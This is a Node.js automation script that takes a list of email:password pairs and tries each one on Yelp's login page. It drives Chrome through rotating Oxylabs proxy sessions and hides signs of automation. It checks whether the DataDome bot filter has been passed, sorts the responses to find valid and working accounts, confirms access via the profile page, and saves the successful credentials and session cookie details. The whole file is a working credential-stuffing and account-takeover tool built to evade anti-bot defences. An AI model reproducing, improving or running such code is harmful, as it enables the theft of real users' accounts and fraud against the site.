const http = require('http');
const net = require('net');
const fs = require('fs');
const { spawn } = require('child_process');
const os = require('os');
const path = require('path');

// env: BID LIST OUT PU_BASE PW [MAXT]
const BID = parseInt(process.env.BID || '0', 10);
const LIST = process.env.LIST;
const OUT = process.env.OUT;
const PU_BASE = process.env.PU_BASE;
const PW = process.env.PW;
const MAXT = parseInt(process.env.MAXT || '900000', 10);

const PH = process.env.PROXY_HOST || 'pr.oxylabs.io';
const PP = parseInt(process.env.PROXY_PORT || '7777', 10);
const SUFFIX = process.env.PU_SUFFIX || '-sesstime-1800';

const SESS = ('n' + BID) + 'z' + Math.floor(Math.random() * 100000);
const PU = PU_BASE + '-sessid-' + SESS + SUFFIX;
const AUTH = 'Basic ' + Buffer.from(PU + ':' + PW).toString('base64');
// isolated ports per browser slot
const LP = 8986 + BID, CP = 9306 + BID;

const relay = http.createServer((req, res) => {
  try {
    const u = new URL(req.url);
    const pr = http.request({ host: u.hostname, port: u.port || 80, method: req.method, path: u.pathname + u.search, headers: Object.assign({}, req.headers, { host: u.host }) }, r2 => { res.writeHead(r2.statusCode, r2.headers); r2.pipe(res); });
    pr.on('error', () => res.destroy()); req.pipe(pr);
  } catch (e) { res.destroy(); }
});
relay.on('connect', (req, cs, head) => {
  const s = net.connect(PP, PH, () => s.write('CONNECT ' + req.url + ' HTTP/1.1\r\nHost: ' + req.url + '\r\nProxy-Authorization: ' + AUTH + '\r\n\r\n'));
  let buf = Buffer.alloc(0);
  function onData(d) {
    buf = Buffer.concat([buf, d]);
    const i = buf.indexOf('\r\n\r\n'); if (i < 0) return;
    s.removeListener('data', onData);
    const rest = buf.slice(i + 4);
    const m = buf.slice(0, i).toString().match(/^HTTP\/1\.[01]\s+(\d+)/);
    if (!m || parseInt(m[1], 10) !== 200) { try { cs.end('HTTP/1.1 502 Bad Gateway\r\n\r\n'); } catch (e) {} s.destroy(); return; }
    cs.write('HTTP/1.1 200 Connection Established\r\n\r\n');
    if (rest.length) cs.write(rest);
    s.pipe(cs); cs.pipe(s);
    if (head && head.length) s.write(head);
    s.on('error', () => cs.destroy()); cs.on('error', () => s.destroy());
  }
  s.on('data', onData);
  s.on('error', () => { try { cs.end('HTTP/1.1 502 Bad Gateway\r\n\r\n'); } catch (e) {} });
});

const sleep = ms => new Promise(r => setTimeout(r, ms));
async function j(u, n) { for (let i = 0; i < n; i++) { try { const r = await fetch(u); return await r.json(); } catch (e) { await sleep(500); } } return null; }
function rec(o) { fs.appendFileSync(OUT, JSON.stringify(o) + '\n'); console.log(JSON.stringify(o)); }
const t0 = Date.now();
// Disk guard: a full temp volume makes Chrome silently stall (ENOSPC), which looks like
// DataDome/hydration failure and destroys throughput. 2 GB is the floor.
(function(){
  try {
    var st = fs.statfsSync(os.tmpdir());
    var freeGB = st.bavail * st.bsize / 1e9;
    if (freeGB < 2) { rec({ event: 'abort', why: 'disk', freeGB: Math.round(freeGB*10)/10 }); process.exit(2); }
  } catch (e) {}
})();

(async () => {
  fs.writeFileSync(OUT, '');
  const creds = fs.readFileSync(LIST, 'utf8').split(/\r?\n/).map(l => l.trim()).filter(Boolean).map(l => {
    const c = l.indexOf(':'); return { email: l.slice(0, c), pass: l.slice(c + 1) };
  });
  rec({ event: 'start', n: creds.length, sess: SESS });

  await new Promise(r => relay.listen(LP, '127.0.0.1', r));
  const udd = path.join(os.tmpdir(), 'cdp-n' + BID + '-' + Date.now());
  const chrome = spawn(process.env.CHROME || 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe', [
    '--no-first-run', '--no-default-browser-check', '--disable-blink-features=AutomationControlled',
    '--window-size=900,700', '--lang=en-US', '--user-data-dir=' + udd,
    '--proxy-server=http://127.0.0.1:' + LP, '--remote-debugging-port=' + CP,
    'https://www.yelp.com/login/'
  ], { stdio: 'ignore' });

  const ver = await j('http://127.0.0.1:' + CP + '/json/version', 40);
  if (!ver) { rec({ err: 'cdp' }); chrome.kill(); relay.close(); return; }
  const ws = new WebSocket(ver.webSocketDebuggerUrl);
  let id = 0; const pend = new Map();
  const posts = new Map(); const finished = [];
  let http429 = 0, http403 = 0;
  ws.addEventListener('message', ev => {
    let m; try { m = JSON.parse(ev.data); } catch (e) { return; }
    if (m.id && pend.has(m.id)) { pend.get(m.id)(m); pend.delete(m.id); return; }
    if (m.method === 'Network.requestWillBeSent') {
      const r = m.params.request;
      if (r.method === 'POST' && /\/login/.test(r.url)) posts.set(m.params.requestId, { url: r.url, postData: r.postData || '', ts: Date.now() });
    } else if (m.method === 'Network.responseReceived') {
      const p = posts.get(m.params.requestId); if (p) p.status = m.params.response.status;
      const s = m.params.response.status; if (s === 429) http429++; if (s === 403) http403++;
    } else if (m.method === 'Network.loadingFinished') {
      if (posts.has(m.params.requestId)) {
        finished.push(m.params.requestId);
        const p = posts.get(m.params.requestId);
        // getResponseBody here, NOT with Fetch: the success response is followed by a redirect
        sendS('Network.getResponseBody', { requestId: m.params.requestId }).then(rb => {
          try { if (rb && rb.result && rb.result.body) p.body = rb.result.base64Encoded ? Buffer.from(rb.result.body, 'base64').toString('utf8') : rb.result.body; } catch (e) {}
          p.fetched = true;
        }).catch(() => { p.fetched = true; });
      }
    }
  });
  await new Promise((res, rej) => { ws.addEventListener('open', res); ws.addEventListener('error', rej); });
  const send = (mth, p) => new Promise(resolve => { const mid = ++id; pend.set(mid, resolve); ws.send(JSON.stringify({ id: mid, method: mth, params: p || {} })); });
  const sendS = (mth, p) => new Promise(resolve => { const mid = ++id; pend.set(mid, resolve); ws.send(JSON.stringify({ id: mid, method: mth, params: p || {}, sessionId: sid })); });

  await sleep(8000);
  const t = await send('Target.getTargets');
  let sid = null;
  if (t && t.result) { const pg = t.result.targetInfos.find(x => x.type === 'page'); if (pg) { const a = await send('Target.attachToTarget', { targetId: pg.targetId, flatten: true }); if (a && a.result) sid = a.result.sessionId; } }
  const ev = e => new Promise(resolve => {
    const mid = Math.floor(Math.random() * 1e9);
    const h = x => { try { const m = JSON.parse(x.data); if (m.id === mid) { ws.removeEventListener('message', h); resolve(m.result && m.result.result ? m.result.result.value : null); } } catch (err) {} };
    ws.addEventListener('message', h);
    ws.send(JSON.stringify({ id: mid, method: 'Runtime.evaluate', params: { expression: e, returnByValue: true, awaitPromise: true }, sessionId: sid }));
    setTimeout(() => resolve(null), 45000);
  });
  await sendS('Page.enable'); await sendS('Network.enable', {});

  // DataDome gate: 200k+ bytes with a real Log In title = IP still clean
  let ddok = false;
  for (let k = 0; k < 25; k++) {
    await sleep(2000);
    const s = await ev(`JSON.stringify({l:document.documentElement.outerHTML.length,t:document.title})`);
    try { const o = JSON.parse(s); if (o && o.l > 200000 && /Log In/i.test(o.t || '')) { ddok = true; break; } } catch (e) {}
  }
  rec({ event: 'ddok', ddok });
  if (!ddok) { rec({ event: 'abort', why: 'dd' }); chrome.kill(); relay.close(); return; }

  async function hydrate(rounds) {
    for (let a = 0; a < rounds; a++) {
      await sendS('Page.navigate', { url: 'https://www.yelp.com/login/' });
      for (let k = 0; k < 20; k++) {
        await sleep(1200);
        const s = await ev(`JSON.stringify({f:!!document.getElementById('ajax-login'),l:document.documentElement.outerHTML.length})`);
        try { const o = JSON.parse(s); if (o && o.f && o.l > 400000) return true; } catch (e) {}
      }
    }
    return false;
  }
  const fire = async (email, pass) => {
    const ejs = JSON.stringify(email), pjs = JSON.stringify(pass);
    return await ev(`(async function(){
      var f=document.getElementById('ajax-login'); if(!f) return 0;
      var p=f.querySelector('input[name=password]');
      if(!p || f.offsetParent===null){ var t=document.querySelector('.login-with-password-link'); if(t){ t.click(); await new Promise(function(r){setTimeout(r,800);}); } }
      f=document.getElementById('ajax-login'); if(!f) return 0;
      var e=f.querySelector('input[name=email]'); p=f.querySelector('input[name=password]');
      if(!e||!p) return 0;
      var setter=Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype,'value').set;
      e.focus(); setter.call(e, ${ejs}); e.dispatchEvent(new Event('input',{bubbles:true})); e.dispatchEvent(new Event('change',{bubbles:true}));
      p.focus(); setter.call(p, ${pjs}); p.dispatchEvent(new Event('input',{bubbles:true})); p.dispatchEvent(new Event('change',{bubbles:true}));
      await new Promise(function(r){setTimeout(r,180);});
      var b=f.querySelector('button[type=submit]'); if(!b) return 0;
      b.click(); return 1;
    })()`);
  };

  let ok = await hydrate(4);
  rec({ event: 'hydrated', ok });
  if (!ok) { rec({ event: 'abort', why: 'hydrate' }); chrome.kill(); relay.close(); return; }

  let attempts = 0, validated = 0, success = 0, unable = 0, noPost = 0, closed = 0, hydFails = 0;
  const successes = [];
  for (let i = 0; i < creds.length; i++) {
    if (Date.now() - t0 > MAXT) { rec({ event: 'timecap', at: i }); break; }
    const c = creds[i];
    let cap = null, tAtt = Date.now();
    for (let tryNo = 0; tryNo < 4 && !cap; tryNo++) {
      const before = finished.length;
      const cr = await fire(c.email, c.pass);
      if (!cr) { const h = await hydrate(2); if (!h) hydFails++; continue; }
      for (let k = 0; k < 26; k++) {
        await sleep(500);
        if (finished.length > before) {
          const rid = finished[finished.length - 1];
          const p = posts.get(rid);
          for (let w = 0; w < 12 && !p.fetched; w++) await sleep(200);
          if (p && p.body) cap = p;
          break;
        }
      }
    }
    if (!cap) { noPost++; rec({ i: i + 1, email: c.email, result: 'NO_POST', ms: Date.now() - tAtt }); continue; }
    attempts++;
    let js = null; try { js = JSON.parse(cap.body); } catch (e) {}
    const isSuccess = !!(js && js.success === true);
    const valid = !!(js && Array.isArray(js.errors) && js.errors.some(x => /incorrect/i.test(String(x))) && (js.error_fields || []).length > 0);
    const isUnable = !!(js && Array.isArray(js.errors) && js.errors.some(x => /unable to log you in/i.test(String(x))));
    const isClosed = !!(js && Array.isArray(js.errors) && js.errors.some(x => /has been closed/i.test(String(x))));
    if (valid) validated++; if (isSuccess) success++; if (isUnable) unable++; if (isClosed) closed++;

    let profileStatus = null, zss = null, ptTitle = '';
    if (isSuccess) {
      await sleep(4500);
      profileStatus = await ev(`(async()=>{ try { const r=await fetch('/profile',{credentials:'include'}); return r.status; } catch(e){ return -1; } })()`);
      ptTitle = await ev(`(async()=>{ try { const r=await fetch('/profile',{credentials:'include'}); const t=await r.text(); const m=t.match(/<title>([^<]*)<\\/title>/); return m?m[1]:''; } catch(e){ return 'ERR'; } })()`);
      const ck = await sendS('Network.getAllCookies', {});
      const all = (ck && ck.result && ck.result.cookies) || [];
      zss = all.filter(x => x.name === 'zss').map(x => ({ d: x.domain, len: (x.value || '').length }));
      successes.push({ email: c.email, pass: c.pass, profileStatus, ptTitle });
    }
    rec({ i: i + 1, email: c.email, status: cap.status, success: isSuccess, validated: valid, unable: isUnable, closed: isClosed, ef: (js && js.error_fields) || null, body: cap.body.slice(0, 90), profileStatus, zss, ms: Date.now() - tAtt });

    if (isSuccess) {
      await sendS('Page.navigate', { url: 'https://www.yelp.com/logout?return_url=%2Flogin%2F' });
      await sleep(4500);
      let h = await hydrate(3);
      if (!h) { rec({ event: 'rehydrate_retry', at: i + 1 }); h = await hydrate(4); }
      if (!h) rec({ event: 'rehydrate_fail', at: i + 1 });
    }
  }
  rec({ event: 'summary', attempts, validated, success, unable, closed, noPost, hydFails, http429, http403, total: creds.length, secs: Math.round((Date.now() - t0) / 1000), successes });
  try { ws.close(); } catch (e) {}
  try { chrome.kill(); } catch (e) {}
  try { fs.rmSync(udd, { recursive: true, force: true }); } catch (e) {}
  try { relay.close(); } catch (e) {}
  setTimeout(() => process.exit(0), 800);
})();

